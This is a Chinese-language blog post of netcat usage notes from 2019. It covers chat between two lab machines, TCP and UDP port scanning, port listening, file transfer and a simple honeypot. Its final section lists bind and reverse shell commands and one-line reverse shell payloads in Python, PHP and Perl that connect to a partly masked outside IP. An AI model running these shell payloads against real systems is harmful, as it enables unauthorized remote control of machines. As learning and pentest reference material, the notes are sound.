---
layout: post
title: "NetCat Tools Notes"
subtitle: "NetCat Tools Notes"
date: 2019-06-08
author: ppbibo
category: Notes
finished: true
---
[TOC]

## NetCat 使用笔记



### Mac ip ：

​			192.168.10.52

### 虚拟机(Windows 7 ) ip : 

​			192.168.10.53



### 0x1 对讲机

1. 设置Mac机器为服务端开启监听模式，执行下面命令

```bash
$ nc -lv 9999
```

参数解析：

​	-l  使用监听模式，管控传入的资料；

​	-v  显示指令执行过程；



2. windows 作为客户端连接 Mac 机器，执行以下命令

```bash
>NC.EXE -nvv 192.168.10.52 9999
```

参数解析：

​	-n  直接使用IP地址，而不通过域名服务器；

​	-v  显示指令执行过程；

![netcat 对讲机](/static/img/netcat 对讲机.png)



### 0x2 端口扫描

1. 查看 Windows 机器开启的端口，执行下面命令

```bash
>netstat -an | more
```



2. mac机器对windwos指定端口进行扫描

```bash
$ nc -v 192.168.10.53 3389
```

![端口扫描](/static/img/端口扫描.png)



3. 扫描windows机器 端口为130-445的网段 , 执行命令

```bash
$ nc -v -z -w 3 192.168.10.53 130-445
```

参数解析：

​	-z  将输入输出关掉，在扫描时使用；

​	-w  设置超时时间为3秒；



![端口段扫描](/static/img/端口段扫描.png)



4. 扫描指定主机的某个UDP端口段，并且返回端口信息

```bash
$ nc -v -z -u 192.168.10.53 20-1024
```

参数解析：

​	-u  使用UDP传输协议；



### 0x3 端口监听

执行命令

```bash
$ nc -lv 81
```

浏览器访问

```bash
http://192.168.10.52:81/
```

*注：先设置监听（不能出现端口冲突），之后如果有外来访问则输出该详细信息到命令行*

![监听本地端口](/static/img/监听本地端口.png)



### 0x4 文件传输

1. 在本机上执行命令

```bash
$ nc -l  9999 < log.txt 
```

2. 在接收文件的机器上执行命令

```bash
nc 192.168.10.52 9999 > log.txt
```



### 0x5 蜜罐

作为蜜罐使用

```bash
>nc -L -p  Port > log.txt
```

参数解析：

​	-L  参数可以不停的监听某一个端口，直到Ctrl+C为止

​	*注意：这一个命令参数“-L”在Windows中有，现在的Linux中是没有这个选项的*



### 0x6 获取shell

获取shell分为正向shell和反向shell

**正向shell ：客户端连接服务器端，想要获取服务器端的shell**

1. 服务器端执行命令

```bash
$ nc -lv 5555 -e /bin/sh
```

2. 客户端执行命令

```bash
$ nc 10x.2xx.150.37 5555
```



**反向shell：客户端连接服务器端，服务器端想要获取客户端的shell**

3. 服务器执行命令

```bash
$ nc -lv 5555
```

4. 客户端执行命令

```bash
$ nc 10x.2xx.150.37 5555 -e /bin/sh
```



**当目标主机没有nc的时候利用python反弹shell**

5. 本地执行命令

```bash
$ nc -lv 5555
```

6. 在目标机器执行命令

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10x.2xx.150.37",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```



**利用PHP反弹shell-Payload**

```bash
php -r '$sock=fsockopen("10x.2xx.150.37",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
```

*注：PHP在一般情况下事禁用exec()函数的*





**利用perl反弹shell-Payload**

```bash
perl -e 'use Socket;$i="10x.2xx.150.37";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

*注：未进行测试*